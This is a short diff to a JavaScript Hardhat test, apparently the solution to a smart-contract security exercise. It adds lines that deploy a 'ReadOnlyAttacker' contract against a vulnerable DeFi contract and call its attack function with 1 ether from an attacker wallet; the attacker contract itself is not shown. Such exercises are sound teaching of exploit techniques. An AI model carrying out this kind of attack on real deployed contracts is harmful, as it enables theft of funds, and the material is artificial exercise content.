@@ -42,6 +42,10 @@ describe(NAME, function () {
 
         // prettier-ignore
         it("conduct your attack here", async function () {
+
+        const attacker = await(await ethers.getContractFactory("ReadOnlyAttacker")).deploy(vulnerableDeFiContract.address, readOnlyContract.address);
+
+        await attacker.connect(attackerWallet).attack({value: ethers.utils.parseEther('1')});
     
     });
 
